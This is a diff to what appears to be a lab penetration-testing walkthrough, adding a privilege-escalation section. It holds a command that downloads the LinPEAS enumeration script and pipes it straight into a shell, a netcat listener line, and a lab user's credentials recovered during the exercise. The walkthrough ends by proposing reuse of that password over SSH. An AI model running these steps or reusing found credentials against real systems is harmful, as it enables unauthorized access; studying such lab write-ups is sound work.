@@ -173,13 +173,42 @@ nc -nlvp 4444
 
 ## 4-Privilege Escalation (Maintaining Access):
 
-We will perform **local enumeration using LinPEAS**, a shell script that automates the collection of important system information that can help a penetration tester identify possible privilege-escalation opportunities.
+- We will perform **local enumeration using LinPEAS**, a shell script that automates the collection of important system information that can help a penetration tester identify possible privilege-escalation opportunities.
+
+(https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+
+```bash
+wget -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+
+<img width="1109" height="942" alt="image" src="https://github.com/user-attachments/assets/02cb3701-7ac1-4f60-ab17-04be5f8482a7" />  
+  
+
+```bash
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+<img width="1251" height="921" alt="image" src="https://github.com/user-attachments/assets/0759d4e4-71de-4a56-a1fb-9e7888d22877" />
+
+
+- We will keep scrolling in this interesting information till we find something useful.
+
+<img width="1277" height="246" alt="image" src="https://github.com/user-attachments/assets/fbcd7008-0d03-42dd-8868-2c1cda83c67d" />  
+<img width="1218" height="198" alt="image" src="https://github.com/user-attachments/assets/37f2052b-8ca2-4edf-a35c-4f996c1f6b4e" />
+<img width="1300" height="173" alt="image" src="https://github.com/user-attachments/assets/dcb162ac-d5c2-44b4-8108-f087f9cb0c78" />
 
 
 
+```bash
+ grimmie
+ My_V3ryS3cur3_P4ss
+```
 
 
-
-
+- Now we have a breakthrough. We found a Grimmie user, who is an administrator, along with her password.
+- If you remember the note we found earlier, Grimmie mentioned that she uses the same password for all of her accounts. Therefore, we can try to use these credentials to SSH into the machine.
+- We also found a CronJob running under Grimmie’s user, which we will investigate as a possible privilege-escalation opportunity.
 
 
